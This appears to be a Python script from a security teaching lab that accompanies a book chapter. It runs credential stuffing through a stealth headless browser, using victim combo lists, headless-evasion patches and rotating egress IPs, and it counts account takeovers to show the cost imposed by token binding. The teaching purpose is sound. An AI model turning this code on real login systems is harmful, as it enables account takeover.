"""
Chapter 9 — Round 4 debrief: the token farm (Section 9.7, Part 5)

The purpose of this script is to show a *cost*, not a bypass. Once L4 blocks
bare logins, the only way to get a valid token is to actually run the page,
so the attacker goes back to a real browser (Patchright) for each login.
That is the whole point of token binding: it drags the attacker off cheap
HTTP and back onto browsers, which cost orders of magnitude more per attempt.

It logs in with a handful of victim credentials through a real browser and
reports the per-attempt cost next to the curl_cffi number from
round4_stuffing.py. With the login_risk.py TODO done, the shared fingerprint
cluster is blocked after a few failures regardless.

Run:  python attacks/round4_token_farm.py [--attempts 6]
"""

import argparse
import os
import sys

from patchright.sync_api import sync_playwright

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import (Cost, browser_login, combo_list, egress_pool, patch_headless_chromium,  # noqa: E402
                     report, rng_for, summary, target, whoami_sid)


def run(attempts=6, verbose=False):
    base = target()
    rng = rng_for("round4farm")
    pool = egress_pool()
    combos = combo_list()[:attempts]
    results = []
    with Cost() as cost:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            for email, password in combos:
                context = browser.new_context(ignore_https_errors=True, locale="en-US",
                                              extra_http_headers={"X-Lab-Egress": rng.choice(pool)})
                page = context.new_page()
                patch_headless_chromium(context, page, browser.version)
                outcome, reasons = browser_login(page, base, email, password)
                results.append({"outcome": outcome, "reasons": reasons,
                                "takeover": outcome == "allow",
                                "confirmed": outcome in ("allow", "challenge"),
                                "sid": whoami_sid(page, base)})
                context.close()
            browser.close()
    s = summary("round4_token_farm", results, cost, success_key="takeover")
    s["confirmed"] = sum(r["confirmed"] for r in results)
    if verbose:
        report(s, success_label="account takeovers")
        print(f"  credentials confirmed: {s['confirmed']}/{s['attempts']}  "
              f"(curl_cffi did a login in ~0.3 s; a browser login costs ~{s['wall_s_per_attempt']} s)")
    return s


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--attempts", type=int, default=6)
    run(parser.parse_args().attempts, verbose=True)
